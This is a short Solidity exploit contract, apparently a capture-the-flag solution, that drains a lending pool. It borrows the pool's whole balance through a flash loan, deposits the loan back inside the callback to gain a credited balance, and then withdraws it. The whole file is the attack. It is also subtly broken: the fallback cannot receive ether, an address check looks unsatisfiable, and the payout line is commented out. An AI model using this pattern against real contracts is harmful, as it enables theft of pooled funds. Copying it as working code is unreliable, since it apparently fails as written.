pragma solidity ^0.8.0;

contract SideAttack {
  address private _pool;
  address private _attacker;

  constructor(address pool, address attacker) {
    _pool = pool;
    _attacker = attacker;
  }

  function attack() external {
    (bool isFlash, ) = _pool.call(
      abi.encodeWithSignature("flashLoan(uint256)", _pool.balance)
    );

    require(isFlash);

    (bool isWithdraw, ) = _pool.call(
      abi.encodeWithSignature("withdraw()")
    );

    require(isWithdraw, "isWithdraw");

    require(address(this) == _attacker);

    // _attacker.call{ value: address(this).balance }("");
  }

  function execute() external payable {
    (bool isDeposit, ) = _pool.call{ value: msg.value }(
      abi.encodeWithSignature("deposit()")
    );

    require(isDeposit);
  }

  fallback() external {

  }
}
